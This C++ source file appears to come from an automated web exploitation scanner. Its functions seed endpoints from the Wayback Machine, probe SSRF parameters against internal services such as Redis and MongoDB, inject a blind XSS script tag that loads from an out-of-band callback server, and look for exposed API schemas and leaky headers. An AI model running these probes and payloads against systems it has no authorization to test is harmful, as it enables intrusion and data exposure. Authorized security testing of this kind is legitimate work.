/// @file scanners/autonomous.cpp
/// @brief Autonomous exploitation: OSINT seeding via Wayback, auto-escalation,
///        blind XSS callback, API schema inference, header deep analysis.
#include "scanner_base.hpp"
#include <set>
#include <sstream>

namespace apex {
namespace {

/// Wayback Machine seeding — discover historical endpoints.
std::vector<Finding> scan_wayback_seed(const Config &cfg [[maybe_unused]], HttpClient &http,
                                       const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Extract domain.
  size_t start = base.find("://") + 3;
  std::string domain = base.substr(start);

  std::string wayback_url =
      "https://web.archive.org/cdx/search/cdx?url=" + domain +
      "/*&output=text&fl=original&collapse=urlkey&limit=50";
  auto resp = http.get(wayback_url);
  if (resp.status_code != 200 || resp.body.empty()) return findings;

  // Parse URLs and probe them.
  std::istringstream stream(resp.body);
  std::string line;
  std::set<std::string> seen;
  int found = 0;
  while (std::getline(stream, line) && found < 10) {
    if (line.empty() || !seen.insert(line).second) continue;
    auto probe = http.get(line);
    if (probe.status_code == 200 && probe.body.size() > 50) {
      findings.push_back({"Wayback Discovery", "info", line,
                          "Historical endpoint still alive", "", "", ""});
      ++found;
    }
  }
  return findings;
}

/// Auto-escalation — chain findings for higher impact.
std::vector<Finding> scan_auto_escalate(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Try SSRF → internal services escalation.
  const std::vector<std::string> internal_targets = {
      "http://127.0.0.1:8080/", "http://127.0.0.1:9200/",
      "http://127.0.0.1:6379/", "http://127.0.0.1:11211/",
      "http://127.0.0.1:27017/", "http://localhost:3000/"};

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "url");
    for (const auto &[tbase, param] : targets) {
      for (const auto &internal : internal_targets) {
        auto resp = http.get(tbase + internal);
        if (resp.status_code == 200 && resp.body.size() > 20 &&
            resp.body.find("<!DOCTYPE") == std::string::npos) {
          findings.push_back({"Auto-Escalate", "critical", url,
                              "SSRF to internal service: " + internal,
                              param, internal, resp.body.substr(0, 100)});
        }
      }
    }
  }
  return findings;
}

/// Blind XSS callback — inject payloads that phone home.
std::vector<Finding> scan_blind_xss(const Config &cfg, HttpClient &http,
                                    const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;

  std::string callback = cfg.oob_server + "/xss";
  std::string payload = "\"><script src=" + callback + "></script>";

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "q");
    for (const auto &[base, param] : targets) {
      http.get(base + payload);
      findings.push_back({"Blind XSS", "info", url,
                          "Blind XSS payload injected (check OOB server)",
                          param, payload, ""});
    }
  }
  return findings;
}

/// API schema inference — discover API structure from responses.
std::vector<Finding> scan_api_schema(const Config &, HttpClient &http,
                                     const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> schema_paths = {
      "/swagger.json", "/openapi.json", "/api-docs", "/swagger/v1/swagger.json",
      "/v1/api-docs", "/v2/api-docs", "/graphql?query={__schema{types{name}}}",
      "/.well-known/openapi.json", "/api/swagger.json"};

  for (const auto &path : schema_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 &&
        (resp.body.find("\"paths\"") != std::string::npos ||
         resp.body.find("\"openapi\"") != std::string::npos ||
         resp.body.find("\"swagger\"") != std::string::npos ||
         resp.body.find("__schema") != std::string::npos)) {
      findings.push_back({"API Schema", "medium", base + path,
                          "API schema exposed", "", "", ""});
    }
  }
  return findings;
}

/// Header deep analysis — extract security-relevant info from headers.
std::vector<Finding> scan_header_analysis(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);

  // Check for information leakage in headers.
  const std::vector<std::string> leak_headers = {
      "X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version",
      "X-Runtime", "X-Version", "X-Debug", "X-Request-Id"};

  for (const auto &hdr : leak_headers) {
    auto it = resp.headers.find(hdr);
    if (it != resp.headers.end() && !it->second.empty()) {
      findings.push_back({"Header Leak", "low", crawl.urls[0],
                          hdr + ": " + it->second, "", "", ""});
    }
  }

  // Check for missing security headers.
  auto csp = resp.headers.find("Content-Security-Policy");
  if (csp != resp.headers.end() && !csp->second.empty()) {
    if (csp->second.find("unsafe-inline") != std::string::npos)
      findings.push_back({"CSP Weakness", "medium", crawl.urls[0],
                          "CSP allows unsafe-inline", "", "", ""});
    if (csp->second.find("unsafe-eval") != std::string::npos)
      findings.push_back({"CSP Weakness", "medium", crawl.urls[0],
                          "CSP allows unsafe-eval", "", "", ""});
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_autonomous_scanners() {
  return {
      {"Wayback Seed", scan_wayback_seed},
      {"Auto-Escalate", scan_auto_escalate},
      {"Blind XSS", scan_blind_xss},
      {"API Schema Inference", scan_api_schema},
      {"Header Analysis", scan_header_analysis},
  };
}

} // namespace apex
